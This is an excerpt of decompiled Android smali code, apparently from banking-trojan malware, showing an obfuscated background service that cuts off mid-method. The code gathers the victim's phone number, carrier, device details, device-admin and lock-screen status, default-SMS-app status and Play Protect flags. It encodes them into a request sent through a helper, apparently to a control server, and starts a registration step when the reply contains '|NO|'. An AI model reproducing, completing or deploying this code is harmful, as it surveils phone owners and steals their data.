.class public Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;
.super Landroid/app/IntentService;


# instance fields
.field a:Lwocwvy/czyxoxmbauu/slsa/c;

.field b:Lwocwvy/czyxoxmbauu/slsa/b;

.field c:Lwocwvy/czyxoxmbauu/slsa/a;

.field d:Landroid/content/Context;

.field e:Ljava/lang/String;

.field f:Ljava/lang/String;

.field g:Ljava/lang/String;

.field h:Ljava/lang/String;

.field i:Ljava/lang/String;

.field j:Ljava/lang/String;

.field k:Ljava/lang/String;

.field l:Ljava/lang/String;

.field m:Ljava/lang/String;

.field n:Landroid/telephony/TelephonyManager;

.field o:I

.field p:I

.field q:I

.field r:I


# direct methods
.method public constructor <init>()V
    .locals 1

    const-string v0, ""

    invoke-direct {p0, v0}, Landroid/app/IntentService;-><init>(Ljava/lang/String;)V

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/c;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/c;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->a:Lwocwvy/czyxoxmbauu/slsa/c;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/b;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v0, Lwocwvy/czyxoxmbauu/slsa/a;

    invoke-direct {v0}, Lwocwvy/czyxoxmbauu/slsa/a;-><init>()V

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->c:Lwocwvy/czyxoxmbauu/slsa/a;

    const-string v0, "0"

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->f:Ljava/lang/String;

    const-string v0, "0"

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->g:Ljava/lang/String;

    const-string v0, ""

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->h:Ljava/lang/String;

    const-string v0, ""

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->i:Ljava/lang/String;

    const-string v0, ""

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->j:Ljava/lang/String;

    const-string v0, ""

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->k:Ljava/lang/String;

    const-string v0, "ERROR"

    iput-object v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->l:Ljava/lang/String;

    const/4 v0, 0x0

    iput v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->o:I

    iput v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->p:I

    iput v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->q:I

    iput v0, p0, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->r:I

    return-void
.end method


# virtual methods
.method a(Ljava/lang/String;)Ljava/lang/String;
    .locals 3

    :try_start_0
    new-instance v0, Ljava/io/BufferedReader;

    new-instance v1, Ljava/io/InputStreamReader;

    invoke-virtual {p0, p1}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->openFileInput(Ljava/lang/String;)Ljava/io/FileInputStream;

    move-result-object p1

    invoke-direct {v1, p1}, Ljava/io/InputStreamReader;-><init>(Ljava/io/InputStream;)V

    invoke-direct {v0, v1}, Ljava/io/BufferedReader;-><init>(Ljava/io/Reader;)V

    const-string p1, ""

    :goto_0
    invoke-virtual {v0}, Ljava/io/BufferedReader;->readLine()Ljava/lang/String;

    move-result-object v1

    if-eqz v1, :cond_0

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v2, p1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object p1
    :try_end_0
    .catch Ljava/io/IOException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :cond_0
    return-object p1

    :catch_0
    const-string p1, ""

    return-object p1
.end method

.method public a()V
    .locals 18

    move-object/from16 v1, p0

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v3, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-class v4, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;

    invoke-virtual {v2, v3, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Landroid/content/Context;Ljava/lang/Class;)Z

    move-result v2

    if-nez v2, :cond_0

    new-instance v2, Landroid/content/Intent;

    const-class v3, Lwocwvy/czyxoxmbauu/slsa/jtfxlnc;

    invoke-direct {v2, v1, v3}, Landroid/content/Intent;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v1, v2}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->startService(Landroid/content/Intent;)Landroid/content/ComponentName;

    :cond_0
    :try_start_0
    sget-object v2, Ljava/util/concurrent/TimeUnit;->SECONDS:Ljava/util/concurrent/TimeUnit;

    const-wide/16 v3, 0x2

    invoke-virtual {v2, v3, v4}, Ljava/util/concurrent/TimeUnit;->sleep(J)V
    :try_end_0
    .catch Ljava/lang/InterruptedException; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    move-object v2, v0

    invoke-virtual {v2}, Ljava/lang/InterruptedException;->printStackTrace()V

    :goto_0
    const-string v2, "phone"

    invoke-virtual {v1, v2}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v2

    check-cast v2, Landroid/telephony/TelephonyManager;

    iput-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->n:Landroid/telephony/TelephonyManager;

    iget-object v2, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    invoke-virtual {v2, v1}, Lwocwvy/czyxoxmbauu/slsa/b;->q(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v2

    sget-object v3, Landroid/os/Build$VERSION;->RELEASE:Ljava/lang/String;

    new-instance v4, Ljava/lang/StringBuilder;

    invoke-direct {v4}, Ljava/lang/StringBuilder;-><init>()V

    sget-object v5, Landroid/os/Build;->MODEL:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, " ("

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    sget-object v5, Landroid/os/Build;->PRODUCT:Ljava/lang/String;

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v5, ")"

    invoke-virtual {v4, v5}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v4}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    iget-object v5, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->n:Landroid/telephony/TelephonyManager;

    invoke-virtual {v5}, Landroid/telephony/TelephonyManager;->getNetworkCountryIso()Ljava/lang/String;

    move-result-object v5

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v7, "android.permission.READ_PHONE_STATE"

    invoke-virtual {v6, v7}, Landroid/content/Context;->checkCallingOrSelfPermission(Ljava/lang/String;)I

    move-result v6

    if-nez v6, :cond_1

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    const-string v7, "("

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->n:Landroid/telephony/TelephonyManager;

    invoke-virtual {v7}, Landroid/telephony/TelephonyManager;->getNetworkOperatorName()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v7, ")"

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->n:Landroid/telephony/TelephonyManager;

    invoke-virtual {v7}, Landroid/telephony/TelephonyManager;->getLine1Number()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v6, v7}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v6

    iput-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->j:Ljava/lang/String;

    goto :goto_1

    :cond_1
    const-string v6, "(NO)"

    iput-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->j:Ljava/lang/String;

    const-string v6, "Indefined"

    iput-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->k:Ljava/lang/String;

    :goto_1
    const-string v6, "device_policy"

    invoke-virtual {v1, v6}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/app/admin/DevicePolicyManager;

    new-instance v7, Landroid/content/ComponentName;

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-class v9, Lwocwvy/czyxoxmbauu/slsa/oyqwzkyy/a/a;

    invoke-direct {v7, v8, v9}, Landroid/content/ComponentName;-><init>(Landroid/content/Context;Ljava/lang/Class;)V

    invoke-virtual {v6, v7}, Landroid/app/admin/DevicePolicyManager;->isAdminActive(Landroid/content/ComponentName;)Z

    move-result v6

    if-eqz v6, :cond_2

    const-string v6, "1"

    iput-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->f:Ljava/lang/String;

    :cond_2
    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v6, "keyguard"

    invoke-virtual {v1, v6}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v6

    check-cast v6, Landroid/app/KeyguardManager;

    invoke-virtual {v6}, Landroid/app/KeyguardManager;->inKeyguardRestrictedInputMode()Z

    move-result v6

    if-nez v6, :cond_3

    const-string v6, "1"

    iput-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->g:Ljava/lang/String;

    :cond_3
    const/4 v6, 0x0

    :try_start_1
    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v9, "SettingsAll"

    invoke-virtual {v7, v8, v9}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    iput-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->e:Ljava/lang/String;

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->e:Ljava/lang/String;

    const-string v8, ""

    if-eq v7, v8, :cond_4

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->e:Ljava/lang/String;

    const-string v8, "~"

    invoke-virtual {v7, v8}, Ljava/lang/String;->split(Ljava/lang/String;)[Ljava/lang/String;

    move-result-object v7

    aget-object v7, v7, v6

    :goto_2
    iput-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->e:Ljava/lang/String;

    goto :goto_3

    :cond_4
    const-string v7, ""
    :try_end_1
    .catch Ljava/lang/Exception; {:try_start_1 .. :try_end_1} :catch_1

    goto :goto_2

    :catch_1
    const-string v7, ""

    iput-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->e:Ljava/lang/String;

    :goto_3
    sget v7, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v8, 0x18

    const/4 v9, 0x1

    if-lt v7, v8, :cond_6

    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    invoke-virtual {v7, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->h(Landroid/content/Context;)Z

    move-result v7

    if-eqz v7, :cond_5

    iput v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->o:I

    goto :goto_4

    :cond_5
    iput v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->o:I

    :goto_4
    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    invoke-virtual {v7, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->g(Landroid/content/Context;)Z

    move-result v7

    if-eqz v7, :cond_7

    :cond_6
    iput v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->o:I

    :cond_7
    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    invoke-virtual {v7, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->g(Landroid/content/Context;)Z

    move-result v7

    if-eqz v7, :cond_8

    iput v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->q:I

    goto :goto_5

    :cond_8
    iput v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->q:I

    :goto_5
    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    invoke-virtual {v7, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->k(Landroid/content/Context;)Z

    move-result v7

    if-eqz v7, :cond_9

    iput v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->p:I

    goto :goto_6

    :cond_9
    iput v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->p:I

    :goto_6
    sget v7, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v10, 0x13

    if-lt v7, v10, :cond_b

    invoke-static/range {p0 .. p0}, Landroid/provider/Telephony$Sms;->getDefaultSmsPackage(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v7

    invoke-virtual/range {p0 .. p0}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->getPackageName()Ljava/lang/String;

    move-result-object v10

    invoke-virtual {v7, v10}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v7

    if-eqz v7, :cond_a

    iput v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->r:I

    goto :goto_7

    :catch_2
    :cond_a
    iput v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->r:I

    goto :goto_7

    :cond_b
    :try_start_2
    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v11, "del_sws"

    invoke-virtual {v7, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    const-string v10, "true"

    invoke-virtual {v7, v10}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v7

    if-eqz v7, :cond_c

    iput v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->r:I

    goto :goto_7

    :cond_c
    iput v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->r:I
    :try_end_2
    .catch Ljava/lang/Exception; {:try_start_2 .. :try_end_2} :catch_2

    :goto_7
    :try_start_3
    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "time_work"

    invoke-virtual {v7, v1, v10}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v7

    iput-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->l:Ljava/lang/String;
    :try_end_3
    .catch Ljava/lang/Exception; {:try_start_3 .. :try_end_3} :catch_3

    goto :goto_8

    :catch_3
    iget-object v7, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v10, "TimeWork"

    const-string v11, "ERROR -> ukhakhcgifofl"

    invoke-virtual {v7, v10, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    :goto_8
    :try_start_4
    iget-object v10, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v11, "play_protect"

    invoke-virtual {v10, v1, v11}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v10

    const-string v11, "true"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v11

    if-eqz v11, :cond_d

    const/4 v10, 0x1

    goto :goto_9

    :cond_d
    const-string v11, "false"

    invoke-virtual {v10, v11}, Ljava/lang/String;->equals(Ljava/lang/Object;)Z

    move-result v10
    :try_end_4
    .catch Ljava/lang/Exception; {:try_start_4 .. :try_end_4} :catch_4

    if-eqz v10, :cond_e

    const/4 v10, 0x0

    goto :goto_9

    :catch_4
    :cond_e
    const/4 v10, 0x2

    :goto_9
    sget v11, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v12, 0x17

    if-lt v11, v12, :cond_f

    const-string v11, "power"

    invoke-virtual {v1, v11}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->getSystemService(Ljava/lang/String;)Ljava/lang/Object;

    move-result-object v11

    check-cast v11, Landroid/os/PowerManager;

    invoke-virtual/range {p0 .. p0}, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->getPackageName()Ljava/lang/String;

    move-result-object v12

    invoke-virtual {v11, v12}, Landroid/os/PowerManager;->isIgnoringBatteryOptimizations(Ljava/lang/String;)Z

    move-result v11

    goto :goto_a

    :cond_f
    const/4 v11, 0x1

    :goto_a
    iget-object v12, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v13, "step"

    invoke-virtual {v12, v1, v13}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v12

    invoke-static {v12}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v12

    iget-object v13, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v14, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v15, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v8, "2"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, "p="

    invoke-virtual {v7, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v9, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    new-instance v6, Ljava/lang/StringBuilder;

    invoke-direct {v6}, Ljava/lang/StringBuilder;-><init>()V

    invoke-virtual {v6, v2}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    move-object/from16 v16, v4

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->f:Ljava/lang/String;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->e:Ljava/lang/String;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->o:I

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->p:I

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->r:I

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->g:Ljava/lang/String;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->q:I

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->l:Ljava/lang/String;

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v10}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v11}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6, v12}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    const-string v4, ":"

    invoke-virtual {v6, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v6}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v9, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->c(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v7, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v14, v15, v8, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->b(Landroid/content/Context;Ljava/lang/String;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    invoke-virtual {v13, v4}, Lwocwvy/czyxoxmbauu/slsa/b;->d(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->m:Ljava/lang/String;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v6, "\u0417\u0430\u043f\u0440\u043e\u0441"

    new-instance v7, Ljava/lang/StringBuilder;

    invoke-direct {v7}, Ljava/lang/StringBuilder;-><init>()V

    const-string v8, " - > "

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    iget-object v8, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->m:Ljava/lang/String;

    invoke-virtual {v7, v8}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v7}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v7

    invoke-virtual {v4, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->m:Ljava/lang/String;

    const-string v6, "|NO|"

    invoke-virtual {v4, v6}, Ljava/lang/String;->contains(Ljava/lang/CharSequence;)Z

    move-result v4

    if-eqz v4, :cond_10

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->c:Lwocwvy/czyxoxmbauu/slsa/a;

    invoke-virtual {v4, v1}, Lwocwvy/czyxoxmbauu/slsa/a;->a(Landroid/content/Context;)Ljava/lang/String;

    move-result-object v4

    iput-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->h:Ljava/lang/String;

    iget-object v4, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->d:Landroid/content/Context;

    const-string v7, "iconCJ"

    invoke-virtual {v4, v6, v7}, Lwocwvy/czyxoxmbauu/slsa/b;->e(Landroid/content/Context;Ljava/lang/String;)Ljava/lang/String;

    move-result-object v4

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v7, "ICON SEND"

    new-instance v8, Ljava/lang/StringBuilder;

    invoke-direct {v8}, Ljava/lang/StringBuilder;-><init>()V

    const-string v9, ""

    invoke-virtual {v8, v9}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8, v4}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v8}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v8

    invoke-virtual {v6, v7, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v7, ""

    const-string v8, "\u0420\u0435\u0433\u0430\u0435\u043c"

    invoke-virtual {v6, v7, v8}, Lwocwvy/czyxoxmbauu/slsa/b;->a(Ljava/lang/String;Ljava/lang/String;)V

    iget-object v6, v1, Lwocwvy/czyxoxmbauu/slsa/ukhakhcgifofl;->b:Lwocwvy/czyxoxmbauu/slsa/b;

    const-string v7, "set_data_p"

